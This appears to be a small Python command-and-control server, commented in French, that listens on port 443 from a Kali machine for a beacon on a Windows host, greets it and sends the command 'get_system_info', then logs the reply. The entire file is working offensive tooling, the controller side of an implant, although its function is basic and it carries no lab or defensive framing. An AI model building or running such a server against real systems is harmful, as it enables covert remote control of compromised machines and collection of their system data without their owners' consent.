# c2_server/server.py
import socket
import time

print("🎮 SERVEUR C2 KALI - DÉMARRAGE")
print("📡 J'écoute sur le port 443...")

# Créer le socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', 443))  # Écoute sur TOUTES les IPs
server.listen(5)

print("✅ SERVEUR ACTIF! En attente de Windows...")
print("💡 IP du Kali:", socket.gethostbyname(socket.gethostname()))

while True:
    try:
        # Attendre une connexion
        client, addr = server.accept()
        print(f"\n🎯 CONNEXION REÇUE de: {addr}")
        
        # Recevoir le message du beacon
        message = client.recv(1024)
        print(f"📨 Beacon dit: {message.decode()}")
        
        # Répondre
        client.send(b"BIENVENUE! Je suis le C2 Kali.")
        print("📤 Réponse envoyée")
        
        # Garder la connexion ouverte
        time.sleep(2)
        client.send(b"Commande: get_system_info")
        
        # Recevoir la réponse
        response = client.recv(1024)
        print(f"📥 Réponse: {response.decode()}")
        
        client.close()
        print("🔌 Déconnecté - En attente suivante...")
        
    except Exception as e:
        print(f"💥 Erreur: {e}")
